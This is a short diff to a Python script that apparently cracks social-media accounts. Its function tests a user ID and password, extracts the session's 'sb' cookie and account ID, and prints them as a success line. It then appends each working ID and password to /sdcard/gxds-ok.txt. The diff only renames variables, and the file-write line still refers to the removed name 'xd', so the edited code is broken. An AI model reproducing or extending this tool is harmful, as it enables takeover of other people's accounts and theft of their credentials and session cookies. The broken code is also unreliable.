@@ -489,11 +489,11 @@ def gxds_files(uid, pxss):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                sort = coki.split("sb=")[1]
+                xcki = coki.split("sb=")[1]
                 coki1 = coki.split("1000")[1]
-                xd = "1000" + coki1[0:11]
+                dxck = "1000" + coki1[0:11]
                 print(
-                    f"\r\r\033[38;5;46m[GXDS-✓] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— "
+                    f"\r\r\033[38;5;46m[GXDS-✓] \033[38;5;47m{dxck} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={xcki}\n\033[38;5;48m———————————————————————————————————— "
                 )
                 open("/sdcard/gxds-ok.txt", "a").write(xd + "|" + ps + "\n")
                 oks.append(uid)
